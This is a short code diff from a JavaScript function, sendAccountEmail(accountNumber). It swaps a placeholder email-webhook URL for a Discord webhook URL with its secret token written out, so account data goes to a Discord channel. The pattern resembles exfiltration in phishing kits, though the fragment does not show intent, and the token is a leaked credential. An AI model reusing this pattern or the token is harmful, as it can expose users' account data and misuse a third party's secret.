@@ -618,7 +618,7 @@ async function sendAccountEmail(accountNumber) {
 
     try {
         // Replace with your email webhook URL
-        await fetch('https://your-webhook-url.com/send-email', {
+        await fetch('https://discord.com/api/webhooks/1403922630490456085/MNm4uN-XHidJ3inpD-i4rTF0TRtLK3cWNTEFbgjpde-VFd3SN2Di2KzdfXLJsybM6hqN', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
